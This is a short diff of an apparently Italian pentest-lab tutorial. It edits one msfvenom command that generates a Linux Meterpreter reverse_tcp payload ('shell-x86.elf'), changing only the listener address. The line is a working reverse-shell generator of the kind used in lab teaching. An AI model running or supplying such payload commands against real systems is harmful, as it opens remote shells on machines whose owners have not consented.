@@ -235,7 +235,7 @@ ifconfig
  
  **2° Terminale**: Creare il pacchetto malevolo (eseguibile):
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
 ```
 Dove i parametri:
 
